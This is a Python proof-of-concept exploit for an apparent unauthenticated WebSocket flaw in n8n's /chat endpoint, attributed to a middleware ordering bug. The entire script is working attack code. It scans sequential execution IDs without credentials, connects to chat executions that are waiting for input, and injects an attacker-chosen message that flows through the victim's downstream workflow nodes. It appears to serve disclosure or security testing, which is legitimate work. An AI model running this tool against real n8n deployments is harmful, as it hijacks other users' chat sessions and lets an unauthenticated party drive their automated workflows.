#!/usr/bin/env python3
"""
n8n Chat WebSocket Session Hijacking PoC

Demonstrates unauthenticated chat session hijacking via the /chat
WebSocket endpoint which lacks authentication due to middleware
registration order.

Chain:
  1. Enumerate execution IDs (sequential integers)
  2. Connect to WebSocket at /chat without authentication
  3. Inject messages into waiting chat executions
  4. Attacker-controlled data flows through all downstream nodes

Usage:
  python3 chat_hijack.py <target_url>
  python3 chat_hijack.py http://10.0.0.5:5678
  python3 chat_hijack.py http://10.0.0.5:5678 --execution-id 42
  python3 chat_hijack.py http://10.0.0.5:5678 --scan-range 1-100
"""

import argparse
import json
import sys
import uuid
import time

try:
    import websocket
except ImportError:
    print("[!] websocket-client required: pip install websocket-client")
    sys.exit(1)


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  n8n Chat WebSocket Unauthenticated Session Hijacking PoC   ║
╚══════════════════════════════════════════════════════════════╝
""")


def ws_url(base_url: str) -> str:
    """Convert HTTP URL to WebSocket URL."""
    return base_url.replace("http://", "ws://").replace("https://", "wss://")


def try_connect(base_url: str, execution_id: int, timeout: float = 3.0) -> bool:
    """Try to connect to a chat execution. Returns True if execution exists."""
    session_id = uuid.uuid4().hex[:16]
    url = f"{ws_url(base_url)}/chat?sessionId={session_id}&executionId={execution_id}"

    try:
        ws = websocket.create_connection(url, timeout=timeout)
        # Read first message
        msg = ws.recv()

        if "does not exist" in msg:
            ws.close()
            return False

        # If we got here, execution exists!
        print(f"    [+] Execution {execution_id} EXISTS — received: {msg[:60]}")
        ws.close()
        return True
    except websocket.WebSocketTimeoutException:
        return False
    except websocket.WebSocketBadStatusException:
        return False
    except Exception as e:
        if "does not exist" in str(e):
            return False
        return False


def scan_executions(base_url: str, start: int, end: int) -> list:
    """Scan for valid execution IDs."""
    print(f"[*] Scanning execution IDs {start}-{end}...")
    found = []

    for eid in range(start, end + 1):
        if try_connect(base_url, eid, timeout=2.0):
            found.append(eid)
        if eid % 10 == 0:
            sys.stdout.write(f"\r    Scanned: {eid}/{end}")
            sys.stdout.flush()

    print(f"\n    [*] Found {len(found)} valid execution(s): {found}")
    return found


def hijack_session(base_url: str, execution_id: int, payload: str):
    """Connect to a chat execution and inject a message."""
    session_id = uuid.uuid4().hex[:16]
    url = f"{ws_url(base_url)}/chat?sessionId={session_id}&executionId={execution_id}"

    print(f"[*] Connecting to execution {execution_id}...")
    print(f"    URL: {url}")
    print(f"    NOTE: No authentication headers or cookies sent!")
    print()

    try:
        ws = websocket.create_connection(url, timeout=10)
        print(f"    [+] WebSocket connected (unauthenticated)")

        # Read initial messages
        while True:
            try:
                msg = ws.recv()
                print(f"    [<] Received: {msg[:100]}")

                if msg == "n8n|heartbeat":
                    ws.send("n8n|heartbeat-ack")
                    print(f"    [>] Sent heartbeat ack")

                if msg == "n8n|continue":
                    print(f"    [*] Execution sent continue signal")

                # Check if it's a chat message (workflow waiting for input)
                if msg not in ("n8n|heartbeat", "n8n|continue", "n8n|heartbeat-ack"):
                    print(f"    [+] Received workflow message — execution is waiting for chat input!")
                    break

            except websocket.WebSocketTimeoutException:
                print(f"    [*] No more messages, sending injection payload...")
                break

        # Inject the attacker's message
        attack_message = json.dumps({
            "action": "sendMessage",
            "chatInput": payload,
            "sessionId": session_id,
        })

        print(f"\n    [>] INJECTING: {attack_message[:100]}...")
        ws.send(attack_message)
        print(f"    [+] Message injected into execution {execution_id}")

        # Wait for response
        print(f"    [*] Waiting for workflow response...")
        time.sleep(2)

        try:
            while True:
                response = ws.recv()
                print(f"    [<] Response: {response[:200]}")
                if response in ("n8n|heartbeat",):
                    ws.send("n8n|heartbeat-ack")
                    continue
                break
        except websocket.WebSocketTimeoutException:
            print(f"    [*] No response received (workflow may still be processing)")

        ws.close()
        print(f"\n    [+] Session hijacking complete")
        return True

    except Exception as e:
        print(f"    [-] Error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="n8n Chat WebSocket Unauthenticated Session Hijacking PoC"
    )
    parser.add_argument("target", help="Target n8n URL (e.g., http://10.0.0.5:5678)")
    parser.add_argument(
        "--execution-id",
        type=int,
        help="Specific execution ID to target",
    )
    parser.add_argument(
        "--scan-range",
        default="1-50",
        help="Range of execution IDs to scan (default: 1-50)",
    )
    parser.add_argument(
        "--payload",
        default="[SECURITY_TEST] This message was injected by an unauthenticated attacker via the chat WebSocket endpoint.",
        help="Chat message payload to inject",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")

    banner()
    print(f"[*] Target: {base_url}")
    print()

    if args.execution_id:
        # Direct injection
        print(f"[*] Targeting execution ID: {args.execution_id}")
        hijack_session(base_url, args.execution_id, args.payload)
    else:
        # Scan and inject
        start, end = map(int, args.scan_range.split("-"))
        found = scan_executions(base_url, start, end)

        if not found:
            print("\n[!] No valid executions found in range.")
            print("[!] Try a wider range with --scan-range or specific ID with --execution-id")
            sys.exit(1)

        print()
        for eid in found:
            print(f"\n{'='*60}")
            hijack_session(base_url, eid, args.payload)

    print()
    print("[+] ═══════════════════════════════════════════════════")
    print("[+]  VULNERABILITY CONFIRMED                          ")
    print("[+]  Chat WebSocket accepts unauthenticated connections")
    print("[+]  due to middleware registration order bug          ")
    print("[+] ═══════════════════════════════════════════════════")

    return 0


if __name__ == "__main__":
    sys.exit(main())
